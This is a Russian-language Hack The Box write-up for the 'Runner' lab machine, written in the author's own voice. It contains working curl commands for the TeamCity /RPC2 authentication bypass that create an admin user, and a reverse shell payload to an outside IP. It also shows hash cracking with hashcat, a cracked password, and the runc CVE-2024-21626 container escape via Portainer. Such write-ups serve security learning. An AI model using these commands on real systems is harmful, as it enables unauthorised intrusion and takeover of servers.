<div class="htb-box-info medium">
  <div class="box-header">
    <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/029d258b4444bc4226b90b1f8f27d086.png" alt="Machine Name">
    <div class="box-details">
      <h2>Box Info</h2>
      <table>
        <tr><td>OS:</td><td>Linux</td></tr>
        <tr><td>Difficulty:</td><td>Medium</td></tr>
        <tr><td>Release:</td><td>20 Apr 2024</td></tr>
      </table>
    </div>
  </div>
</div>

# user flag
### enumeration
Начинаем со скана открытых портов:
```
nmap -sC -sV -vv 10.129.230.247

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
8000/tcp open  http        nginx 1.18.0 (Ubuntu)
```
![[Pasted image 20260501192101.png]]

На порту 80 видим стандартную страницу nginx:
![[Pasted image 20260501192307.png]]

Находим возможных пользователей через стандартные страницы:
![[Pasted image 20260501192401.png]]![[Pasted image 20260501192406.png]]

Порт 8000:
![[Pasted image 20260501192548.png]]

Запускаем **gobuster** по порту 8000:
```
gobuster dir -u http://10.129.230.247:8000/ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt
```
![[Pasted image 20260501200334.png]]

Пробуем найти поддомены на основном хосте. Сначала с дефолтным списком — ничего.
```
ffuf -u http://10.129.230.247 -H "Host: FUZZ.runner.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -mc all -ac
```

Пробуем с другим списком:
```
ffuf -u http://10.129.230.247 -H "Host: FUZZ.runner.htb" \
  -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -mc all -ac
```
![[Pasted image 20260502110822.png]]

Нашли поддомен: `teamcity.runner.htb`. Добавляем оба домена в `/etc/hosts`:
```
10.129.230.247  teamcity.runner.htb runner.htb
```
![[Pasted image 20260502110609.png]]

### TeamCity
На порту 80 по `teamcity.runner.htb` открыта панель **TeamCity**. Нам доступна страница администрирования:

![[Pasted image 20260502111706.png]]

#### Ручная эксплуатация
Уязвимость заключается в том, что любой запрос, оканчивающийся на `/RPC2`, обходит авторизацию. Это позволяет создать токен, затем создать пользователя с правами администратора и выполнять код на системе.

**1. Создаём токен:**
```bash
curl -X POST 'http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2'
```

OUTPUT:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<token name="RPC2" creationTime="2026-05-03T05:02:13.301Z"
  value="eyJ0eXAiOiAiVENWMiJ9.RGFrallWcDJ0cUtsVVliRHByWXdXOUlvQkJB.ODI1M2RmYTMtMjNiMy00OWI1LTg4Y2QtODk1NzVjYmE2NGVm"/>
```

Если пользователь с `id:1` уже занят, пробуем `id:2`. При необходимости удаляем старые токены:
```bash
curl -X DELETE 'http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2'
```

**2. Создаём пользователя с правами SYSTEM_ADMIN:**
```bash
curl 'http://teamcity.runner.htb/app/rest/users' \
  -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnFZLXRQdVBSYTJrTWpTeVlUMzNaRXJVdEtj.ODAxODAyM2QtZDM2Mi00MTUxLWFlNzQtZDlkYzNjNGNhMDky' \
  -H "Content-Type: application/json" \
  --data '{"username": "root", "password": "root123", "email": "", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
```

#### Автоматический эксплойт
Можно использовать готовый скрипт:
```bash
python3 rce.py -u http://teamcity.runner.htb -t token \
  -c '"/bin/bash"&params="-c"&params="sh -i >& /dev/tcp/10.10.15.42/9001 0>&1"'
```

Заходим на сервис. 
![[Pasted image 20260503102224.png]]

Теперь знаем что где-то лежат ssh ключи:
![[Pasted image 20260503102355.png]]

В процессе изучения панели нашёл вкладку **Backup**:
![[Pasted image 20260503104614.png]]

Качаем zip-архив с бэкапом. Внутри находим файлы конфигурации:
![[Pasted image 20260503104635.png]]

В одном из файлов - пользователи:
![[Pasted image 20260503104705.png]]

Затем я нашел тот ssh ключ:
![[Pasted image 20260503104941.png]]

#### Подключение по SSH
Пробуем найти правильное имя пользователя. В списке подходит **john**. Подключаемся с найденным ключом:
```bash
ssh -i id_rsa john@runner.htb
```

Получаем **user flag**:
```bash
cat user.txt
***********6e147f7a4131b1d37e46a
```

---

# root flag

### enumeration
Видим, что в системе установлен Docker:
![[Pasted image 20260503105811.png]]

Я нашел порт 9000:
```bash
curl http://localhost:9000
```

OUTPUT:
```html
<meta name="author" content="Portainer.io"/>
```

Portainer — это веб-интерфейс для управления Docker. Пробрасываем порт через SSH-туннель:
```bash
ssh -i id_rsa -L 9000:localhost:9000 john@runner.htb
```

нужны креды...
![[Pasted image 20260503105525.png]]

Пробуем взломать хеш пользователя, найденного ранее в бэкапе. Копируем хеш в файл и запускаем hashcat:
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Найден пароль для пользователя **matthew**:
```
$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
```

Заходим в Portainer:
![[Pasted image 20260502145854.png]]

Видим 2 образа.. это убунту и тимсити...
![[Pasted image 20260502145939.png]]

### runc exploit (CVE-2024-21626)
Погуглив версии Docker и runc, я нашёл уязвимость CVE-2024-21626.

>runc is a CLI tool for spawning and running containers on Linux according to the OCI specification. In runc 1.1.11 and earlier, due to an internal file descriptor leak, an attacker could cause a newly-spawned container process (from runc exec) to have a working directory in the host filesystem namespace, allowing for a container escape by giving access to the host filesystem (“attack 2”). The same attack could be used by a malicious image to allow a container process to gain access to the host filesystem through runc run (“attack 1”). Variants of attacks 1 and 2 could be also be used to overwrite semi-arbitrary host binaries, allowing for complete container escapes (“attack 3a” and “attack 3b”). runc 1.1.12 includes patches for this issue.

Так как мы не можем запускать `docker` напрямую, используем Portainer для создания контейнера с рабочей директорией `/proc/self/fd/8`. Двигаясь по директориям, получаем доступ к хост-системе.

Создаём контейнер через Portainer:
![[Pasted image 20260502153558.png]]
![[Pasted image 20260502153617.png]]

Эксплуатация - через смену рабочей директории. Получаем заветный флаг...
![[Pasted image 20260502153453.png]]
